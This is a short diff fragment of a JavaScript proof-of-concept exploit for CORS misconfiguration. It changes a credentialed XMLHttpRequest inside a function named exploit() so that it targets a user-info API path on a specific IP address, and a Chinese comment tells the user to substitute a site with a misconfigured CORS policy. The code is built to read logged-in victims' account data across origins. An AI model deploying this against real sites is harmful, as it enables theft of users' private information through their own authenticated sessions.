@@ -9,7 +9,7 @@ function exploit() {
      
       }
  };
- xhttp.open("GET", "http://139.224.42.111/", true); //将 URL 更改为错误配置 CORS 策略的 URL
+ xhttp.open("GET", "http://139.224.42.111/api/user/passport/auth/getUserInfo", true); //将 URL 更改为错误配置 CORS 策略的 URL
  xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
  xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhttp.withCredentials = true;
